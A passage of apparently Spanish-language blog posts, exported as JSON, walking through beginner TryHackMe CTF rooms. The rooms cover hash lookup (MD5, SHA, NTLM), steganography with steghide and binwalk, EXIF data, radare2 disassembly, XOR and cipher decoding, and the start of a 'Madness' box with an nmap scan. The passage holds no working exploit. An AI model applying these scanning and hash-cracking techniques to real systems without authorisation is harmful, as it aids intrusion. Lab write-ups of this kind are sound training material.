wdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzA9 HASHES #1 MD2 Reto:\n39d4a2ba07e44421c9bedd54dc4e1182 Solucion:\nhttps://md5hashing.net/hash/md2/39d4a2ba07e44421c9bedd54dc4e1182 #2 MD4 Reto:\ne0418e7c6c2f630c71b2acabbcf8a2fb Solucion:\nhttps://md5hashing.net/hash/md4/e0418e7c6c2f630c71b2acabbcf8a2fb #3 MD5 Reto:\nefbd448a935421a54dda43da43a701e1 Solucion:\nhttps://md5hashing.net/hash/md5/efbd448a935421a54dda43da43a701e1 #4 NTLM Reto:\n11FE61CE0639AC2A1E815D62D7DEEC53 Solucion:\nMicrosoft has encryption? #5 SHA512 Reto:\na361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 Solucion:\nhttps://md5hashing.net/hash/sha512/a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8 #6 SHA256 Reto:\nd48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f Solucion:\nhttps://md5hashing.net/hash/sha256/d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f #7 SHA1 Reto:\na34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 Solucion:\nhttps://md5hashing.net/hash/sha1/a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0 SPECTROGRAMS En este reto nos proporcionan un archivo wav, utilizamos Sonic Vizualiser y agregando una capa de Spectrograma logramos ver la flag.\nSTEGANOGRAPHY Utilizamos steghide para extraer los archivos contenidos dentro de la imagen.\n1 2 3 4 5 6 7 8 ➜ capture_the_flag steghide extract stegosteg.jpg steghide: unknown argument \u0026#34;stegosteg.jpg\u0026#34;. steghide: type \u0026#34;steghide --help\u0026#34; for help. ➜ capture_the_flag steghide extract -sf stegosteg.jpg Enter passphrase: wrote extracted data to \u0026#34;steganopayload2248.txt\u0026#34;. ➜ capture_the_flag cat steganopayload2248.txt Spa[... snip ...]teg% SECURITY THROUGH OBSCURITY En este reto nos proporcionan una imagen en la que se aplica nuevamente esteganografia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ➜ capture_the_flag binwalk meme.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression ➜ capture_the_flag binwalk meme.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar e \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly WARNING: Extractor.execute failed to run external extractor \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39;: [Errno 2] No such file or directory: \u0026#39;unrar\u0026#39;: \u0026#39;unrar\u0026#39;, \u0026#39;unrar -x \u0026#39;%e\u0026#39;\u0026#39; might not be installed correctly 74407 0x122A7 RAR archive data, version 5.x 74478 0x122EE PNG image, 147 x 37, 8-bit/color RGBA, non-interlaced 74629 0x12385 Zlib compressed data, default compression Extraemos el archivo rar.\n1 2 3 4 5 6 7 8 9 10 11 ➜ _meme.jpg.extracted unrar e 122A7.rar UNRAR 5.50 freeware Copyright (c) 1993-2017 Alexander Roshal Extracting from 122A7.rar Extracting hackerchat.png OK All OK ➜ _meme.jpg.extracted ls 122A7.rar 12385 12385.zlib hackerchat.png Utilizamos Strings para ver nuestra flag en la nueva imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 ➜ _meme.jpg.extracted strings hackerchat.png| tail \u0026#39;[SQP S~j@6h vA}= *s\u0026amp;__ @9Xs {@84 2$Es i2Mc IEND \u0026#34;AHH_[... snip ...]_ME!\u0026#34; ➜ _meme.jpg.extracted ","description":"C4ptur3-th3-fl4g es una sala de TryHackMe que presenta una serie de retos, utilizamos CyberChef y herramientas en Linux para encontrar la solucion de cada uno de los retos.","id":165,"section":"posts","tags":["cyberchef","steganography","binwalk"],"title":"TryHackMe - c4ptur3-th3-fl4g","uri":"https://sckull.github.io/posts/c4ptur3-th3-fl4g/"},{"content":"\rCTF collection Vol.1 es una serie de retos de Esteganografia, Reversing, Analisis de Codigo, OSINT like.\nRoom Titulo CTF collection Vol.1 Descripción Sharpening up your CTF skill with the collection. The first volume is designed for beginner. Puntos 700 Dificultad Facil Maker DesKel What does the base said? Can you decode the following?\nReto:\n1 VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ== Reto:\n1 Base64 Meta meta Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ➜ ctf_collection_vol1 exiftool Findme.jpg ExifTool Version Number : 10.80 File Name : Findme.jpg Directory : . File Size : 34 kB File Modification Date/Time : 2020:02:12 17:29:21-06:00 File Access Date/Time : 2020:02:12 17:29:54-06:00 File Inode Change Date/Time : 2020:02:12 17:29:49-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 X Resolution : 96 Y Resolution : 96 Exif Byte Order : Big-endian (Motorola, MM) Resolution Unit : inches Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - Flashpix Version : 0100 Owner Name : THM{... snip ...} Comment : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 60. Image Width : 800 Image Height : 480 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 800x480 Megapixels : 0.384 ➜ ctf_collection_vol1 Mon, are we going to be okay? Something is hiding. That\u0026rsquo;s all you need to know.\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;Final_message.txt\u0026#34;: size: 79.0 Byte encrypted: rijndael-128, cbc compressed: yes ➜ ctf_collection_vol1 steghide extract -sf Extinction.jpg Enter passphrase: wrote extracted data to \u0026#34;Final_message.txt\u0026#34;. ➜ ctf_collection_vol1 cat Final_message.txt It going to be over soon. Sleep my child. THM{... snip ...} ➜ ctf_collection_vol1 Erm\u0026hellip;\u0026hellip;Magick Huh, where is the flag?\nSolucion:\nQRrrrr Such technology is quite reliable.\nSolucion:\nReverse it or read it? Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ➜ ctf_collection_vol1 r2 hello.hello [0x00001060]\u0026gt; aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [x] Analyze function calls (aac) [x] Use -AA or aaaa to perform additional experimental analysis. [x] Constructing a function name for fcn.* and sym.func.* functions (aan) [0x00001060]\u0026gt; afl 0x00001000 3 23 sym._init 0x00001030 1 6 sym.imp.puts 0x00001040 1 6 sym.imp.printf 0x00001050 1 6 sub.__cxa_finalize_248_50 0x00001060 1 43 entry0 0x00001090 3 33 sym.deregister_tm_clones 0x000010c0 3 50 sym.register_tm_clones 0x00001100 4 49 sym.__do_global_dtors_aux 0x00001140 1 5 entry1.init 0x00001145 1 24 sym.skip 0x0000115d 1 23 sym.main 0x00001180 4 93 sym.__libc_csu_init 0x000011e0 1 1 sym.__libc_csu_fini 0x000011e4 1 9 sym._fini [0x00001060]\u0026gt; pdf @sym.skip / (fcn) sym.skip 24 | sym.skip (); | 0x00001145 55 push rbp | 0x00001146 4889e5 mov rbp, rsp | 0x00001149 488d3db80e00. lea rdi, qword str.THM_345y_f1nd_345y_60 ; 0x2008 ; \u0026#34;THM{... snip ...}\u0026#34; | 0x00001150 b800000000 mov eax, 0 | 0x00001155 e8e6feffff call sym.imp.printf ; int printf(const char *format) | 0x0000115a 90 nop | 0x0000115b 5d pop rbp \\ 0x0000115c c3 ret [0x00001060]\u0026gt; Another decoding stuff Can you decode it?\nReto:\n1 3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L Solucion:\nLeft or right Left, right, left, right\u0026hellip; Rot 13 is too mainstream. Solve this\nReto:\n1 MAF{atbe_max_vtxltk} Solucion:\nMake a comment No downloadable file, no ciphered or encoded text. Huh \u0026hellip;\u0026hellip;.\nSolucion:\nCan you fix it? I accidentally messed up with this PNG file. Can you help me fix it? Thanks, ^^\nPasamos el archivo a Hexadecimal, editamos el archivo y reemplazamos la cantidad de \u0026ldquo;magic numbers\u0026rdquo; de un archivo PNG, luego de esto podemos obtener nuestra imagen renderizando la con CyberChef.\nReto:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ➜ ctf_collection_vol1 xxd -p spoil.png \u0026gt; spoil_hex_data ➜ ctf_collection_vol1 head spoil head: cannot open \u0026#39;spoil\u0026#39; for reading: No such file or directory ➜ ctf_collection_vol1 head spoil_hex_data 2333445f0d0a1a0a0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1 vim spoil_hex_data ➜ ctf_collection_vol1 head spoil_hex_data 89504E470D0A1A0A0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1 Solucion:\nRead it Some hidden flag inside Tryhackme social account.\nSolucion:\nSpin my head What is this?\nReto:\n1 ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;++++++++++++++.------------.+++++.\u0026gt;+++++++++++++++++++++++.\u0026lt;\u0026lt;++++++++++++++++++.\u0026gt;\u0026gt;-------------------.---------.++++++++++++++.++++++++++++.\u0026lt;++++++++++++++++++.+++++++++.\u0026lt;+++.+.\u0026gt;----.\u0026gt;++++. Solucion:\nAn exclusive! Exclusive strings for everyone!\nReto:\n1 2 S1: 44585d6b2368737c65252166234f20626d S2: 1010101010101010101010101010101010 Solucion:\n1 2 3 4 5 6 script.py s1 = \u0026#34;44585d6b2368737c65252166234f20626d\u0026#34; s2 = \u0026#34;1010101010101010101010101010101010\u0026#34; a = hex(int(s1, 16) ^ int(s2, 16))[2:] print(bytes.fromhex(a).decode(\u0026#39;utf-8\u0026#39;)) Binary walk Please exfiltrate my file :)\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ➜ ctf_collection_vol1 binwalk hell.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 binwalk hell.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 ls Extinction.jpg Findme.jpg _hell.jpg.extracted help.txt spoil_hex_data ti.py Final_message.txt hell.jpg hello.hello img spoil.webp ➜ ctf_collection_vol1 ls _hell.jpg.extracted 40E75.zip hello_there.txt ➜ ctf_collection_vol1 cat _hell.jpg.extracted/hello_there.txt Thank you for extracting me, you are the best! THM{... snip ...} ➜ ctf_collection_vol1 Darkness There is something lurking in the dark.\nSolucion:\nA sounding QR How good is your listening skill?\nP/S: The flag formatted as THM{Listened Flag}, the flag should be in All CAPS\nSolucion:\nQR:\nDescargamos el archivo de audio y utilizamos Speech to Text.\nDig up the past Sometimes we need a \u0026lsquo;machine\u0026rsquo; to dig the past.\nReto:\n1 2 Targetted website: https://www.embeddedhacker.com/ Targetted time: 2 January 2020 Utilizamos web.archive.org para obtener nuestra flag en la fecha descrita.\nSolucion:\nUncrackable! Can you solve the following? By the way, I lost the key. Sorry \u0026gt;.\u0026lt;\nReto:\n1 2 3 MYKAHODTQ{RVG_YVGGK_FAL_WXF} Flag format: TRYHACKME{FLAG IN ALL CAP} Utilizamos Vignere Decoder para obtener primero la KEY, utilizamos el formato del flag como KEY (TRYHACKME), luego de eso utilizamos el mismo formato de lo que obtuvimos.\nSolucion:\nSmall bases Decode the following text.\nReto:\n1 581695969015253365094191591547859387620042736036246486373595515576333693 Solucion:\nDecimal \u0026gt; Hex\nHex - Ascii\nRead the packet I just hacked my neighbor\u0026rsquo;s WiFi and try to capture some packet. He must be up to no good. Help me find it.\nSolucion:\nHTTP Wireshark.\n","description":"CTF collection Vol.1 es una serie de retos de Esteganografia, Reversing, Analisis de Codigo, OSINT like.","id":166,"section":"posts","tags":[],"title":"TryHackMe - CTF collection Vol.1","uri":"https://sckull.github.io/posts/ctf_collection_vol1/"},{"content":"\rMadness es una maquina de TryHackMe que presenta distintos retos tras enumerar el sitio web y obtener credenciales para ingresar por SSH. Escalamos privilegios con una vulnerabilidad en screen.\nRoom Titulo Madness Descripción Will you be consumed by Madness? Puntos 160 Dificultad Facil Maker optional NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Thu Feb 6 19:01:14 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.53.61 Nmap scan report for 10.10.53.61 Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA) | 256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA) |_ 256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 6 19:16:00 2020 -- 1 IP address (1 host up) scanned in 886.81 seconds HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nEn el codigo fuente de la pagina encontramos una image la cual no se muestra en la pagina y al visitarla no se logra visualizar.\nDescargamos la imagen y al ver el tipo de archivo nos muestra lo siguiente:\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@aoiri:~/tryhackme/madness# xxd thm.jpg |head 00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001 .PNG............ 00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203 .......C........ 00000020: 0303 0304 0303 0405 0805 0504 0405 0a07 ................ 00000030: 0706 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d ................ 00000040: 0e11 0e0b 0b10 1610 1113 1415 1515 0c0f ................ 00000050: 1718 1614 1812 1415 14ff db00 4301 0304 ............C... 00000060: 0405 0405 0905 0509 140d 0b0d 1414 1414 ................ 00000070: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000080: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000090: 1414 1414 1414 1414 1414 1414 1414 ffc0 ................ root@aoiri:~/tryhackme/madness# file thm.jpg thm.jpg: data Vemos que los magic numbers pertenecen a PNG cuando el archivo esta con extencion JPG, utilizamos xxd para 